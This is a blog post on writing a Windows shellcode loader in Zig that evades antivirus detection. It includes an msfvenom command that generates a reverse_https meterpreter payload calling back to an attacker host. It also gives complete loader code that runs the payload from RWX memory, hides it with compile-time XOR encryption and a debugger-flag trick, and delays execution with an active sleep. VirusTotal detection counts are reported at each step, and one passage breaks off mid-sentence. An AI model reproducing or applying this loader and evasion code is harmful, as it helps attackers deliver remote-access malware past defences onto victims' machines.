---
layout: post
title: "Easy shellcode encryption in Zig"
---





With that said, let's get down to the "Hello world!" of offensive security - a simple shellcode loader. I'm gonna use staged meterpreter, generated with `msfvenom -p windows/x64/meterpreter/reverse_https -o src/meterpreter.bin LHOST=192.168.56.1 LPORT=443`. 
I chose meterpreter because it's been around for long so all decent AV products
should  detect its static signatures(how sad I was to found out this is not true), which makes it perfect for our examples. The loader is very simple -- I allocate RWX memory with `VirtualAlloc`, copy the shellcode into
it and then call a function pointer to the shellcode.

## Simple shellcode loader
```zig
const std = @import("std");
const win32 = @import("win32");

const VirtualAlloc = win32.system.memory.VirtualAlloc;
const VIRTUAL_ALLOCATION_TYPE = win32.system.memory.VIRTUAL_ALLOCATION_TYPE;
const PAGE_EXECUTE_READWRITE = win32.system.memory.PAGE_EXECUTE_READWRITE;

pub fn main() !void {
    // We include the compile as a string at compile time
    const shellcode = @embedFile("meterpreter.bin");
    // Allocate RWX memory for the shellcode
    const allocated_memory_ptr: [*]u8 = @ptrCast(VirtualAlloc(null, shellcode.len, VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1 }, PAGE_EXECUTE_READWRITE).?);
    // We copy the shellcode to the memory.
    @memcpy(allocated_memory_ptr, shellcode);
    // Cast the RWX memory to a function pointer and then call it.
    const shellcode_fn: *const fn () void = @ptrCast(allocated_memory_ptr);
    shellcode_fn();
}
```

The code should be relatively simple to anyone with knowledge of C. However, the first thing that comes to eye of anyone who ever included meterpreter in C files
is the `embedFile` builtin. This builtin includes a whole binary file into our code as a string, and we can directly use it later.

For WinAPI bindings I use the project [marlersoft/zigwin32](https://github.com/marlersoft/zigwin32) , and it's very simple to call a C function. We need to cast the type to `[*]u8`, which means
a pointer to multiple characters. Zig distinguishes between single element pointers and array pointers, which makes it simple to state your intent.

After that, we copy the shellcode and call a function pointer to it.

The suprising thing for me were results from VirusTotal:
![basic shellcode loader virus total]({{site.url}}/assets/zig01/basic_vt.png)
 Welcome to year 2024 when only 24 AVs are capable of finding embedded meterpreter. I would be really happy to tell you that it's because of some dark optimizations that Zig performed, but to my disappointment the assembly is just straightforward and the whole shellcode is embedded in `.rdata`.

![basic shellcode disassembly]({{site.url}}/assets/zig01/basic_disassembly.png).

### Compile time encryption
The first big problem of our shellcode is that it's a sitting duck in the `.rdata` section. To achieve better results and bypass static signatures, we need to decrypt it during runtime. 
Zig offers us the `comptime` keyword, which enables us to run Zig code at compile time. This is similar to C macros or C++ template metaprogramming, however it is easier to read and write.

```zig
const std = @import("std");
const win32 = @import("win32");

const VirtualAlloc = win32.system.memory.VirtualAlloc;

const VIRTUAL_ALLOCATION_TYPE = win32.system.memory.VIRTUAL_ALLOCATION_TYPE;
const PAGE_EXECUTE_READWRITE = win32.system.memory.PAGE_EXECUTE_READWRITE;

//encrypt is a function that takes a compile time known string, and returns it encrypted
fn encrypt(comptime string: []const u8, k: u8) [string.len]u8 {
    // Zig has a default compilation timeout
    // We override it  to a big number so that the whole encryption can happen
    @setEvalBranchQuota(100000000);
    var encrypted_string: [string.len]u8 = undefined;
    // This loops over all characters of string - chr, and idx is the index
    for (string, 0..) |chr, idx| {
        // We do not want to xor with a single value, so we use also the index
        const key: u8 = @truncate((idx * 83) % 256);
        encrypted_string[idx] = chr ^ key ^ k;
    }
    return encrypted_string;
}

// This is very similar to the encrypt function
fn decrypt(mem: []u8, s: []const u8, k: u8) void {
    for (s, 0..) |chr, idx| {
        const key: u8 = @truncate((idx * 83) % 256);
        // The one difference is that this function also calls shouldRun, which should return 0
        // shouldRun is a function that ensures this is evaluated during runtime
        // this is how we prevent Zig from optimizing decryption out
        mem[idx] = chr ^ key ^ k + shouldRun();
    }
}
fn comptimeObfuscation(comptime s: []const u8) [s.len]u8 {
    const key = 0x42;
    // We call encrypt at comptime
    const enc_str = comptime encrypt(s, key);
    var ret_array: [s.len]u8 = [_]u8{0} ** s.len;
    decrypt(&ret_array, &enc_str, key);

    return ret_array;
}

fn shouldRun() u8 {
    // The value of BeingDebugged is determined during runtime
    const peb = std.os.windows.peb();
    return peb.BeingDebugged;
}

pub fn main() !void {
    // We include the shellcode as a string at compile time, and encrypt it
    const shellcode = comptimeObfuscation(@embedFile("meterpreter.bin"));
    const allocated_memory_ptr: [*]u8 = @ptrCast(VirtualAlloc(null, shellcode.len, VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1 }, PAGE_EXECUTE_READWRITE).?);
    @memcpy(allocated_memory_ptr, shellcode[0..]);
    const shellcode_fn: *const fn () void = @ptrCast(allocated_memory_ptr);
    shellcode_fn();
}

```

Our goal is to invoke the encrypt function during compile time -- Zig's `comptime` keyword enforces this. However, from my experiments, Zig was very eager to also run the decryption at compile time, and thus leaving the shellcode inside. From compiler's point of view this is obvious optimalization, however we do not want this. The simplest way is to make the `decrypt` function depend on any runtime value, 
and I chose the `BeingDebugged` which should be 0 unless program is debugged. The Ghidra decompiler proves that the compiled executable really decrypts the shellcode at runtime:
![disassembly of encrypted shellcode loader]({{site.url}}/assets/zig01/encrypted_disassembly.png)

The results from VirusTotal are not very encouraging. The encryption of shellcode only managed to bypass 5 products, which means we still have a long way to go.
![encrypted shellcode loader virus total]({{site.url}}/assets/zig01/encrypted_vt.png)



## Behavior 
Our encryption is robust and I'm pretty sure that no signatures can be found for our payloads. We can determine which products perform behavior checks by timing them out. To do this, I found a [md5 brute force snippet](https://www.reddit.com/r/adventofcode/comments/szphy0/2015_day_04zig_some_tips_to_solve_the_problem/) online. We will use this snippet to performe active sleep before decrypting and executing the payload. I will not explain the code, as it's just a simple md5 hash cracking. The point is to use *any* slow computation without relying on functions that can be hooked by AV.

Adding the active sleep, we can get to only 1 detection:
![encrypted shellcode loader virus total]({{site.url}}/assets/zig01/sleep_vt.png)

Of course, this does not mean that the payload would get executed in a real-world system. The behavior of meterpreter is pretty well known, and Windows defender consistently blocks it once it gets decrypted. However, the purpose of this blog was not to show that meterpreter is viable for Red Teaming against modern technologies, but just to show how simple it is in Zig to create compile time static signatures obfuscation.

## Stageless meterpreter
We made the job little bit harder for the AVs by using staged version of meterpreter. The shellcode of staged meterpreter is pretty small and it might be difficult to spot it. To try if they can do better, I also tried the same experiment with stageless meterpreter, where I encountered completely different issues.

First of all, the baseline of no encryption and no sleep was higher, indicating that there are definitely more signatures for the stageless version:

![encrypted shellcode loader virus total]({{site.url}}/assets/zig01/stageless_vt.png)

After going through the hoops of encryption and sleep, we get to 8 detections:

![encrypted shellcode loader virus total]({{site.url}}/assets/zig01/stageless_enc_sleep.png)

The reason for these detections is simple, the `.rdata` section is filled with 200KB of random nonsense and it's easy for any ML algorithm to pick up the entropy anomaly.

![encrypted shellcode loader entropy]({{site.url}}/assets/zig01/encrypted_entropy.png)

What I wanted to do next is to reduce this entropy - my idea was to simply prepend each encrypted byte with bunch of zeroes. However, this was not possible as Zig's `comptime` eats a LOT of RAM. Even compiling the previous encryption 

However, compiling this took around 5 minutes on my machine, indicating that Zig's `comptime` is not yet suitable for very large payloads.
This basically encompasses my overall feelings of Zig - I like the language, and I think it has big potential for offensive tooling, but it's obvious that the language is still largely in development. Features of this language get added/removed pretty often, and new versions often bring breaking changes. 

However, I still think it's already usable for small projects in red teaming space, s.a. shellcode loaders. I plan to go over several small examples in this blog, and how features of Zig help there. Next blog will be about `comptime` hashing and a custom GetModuleHandle function.










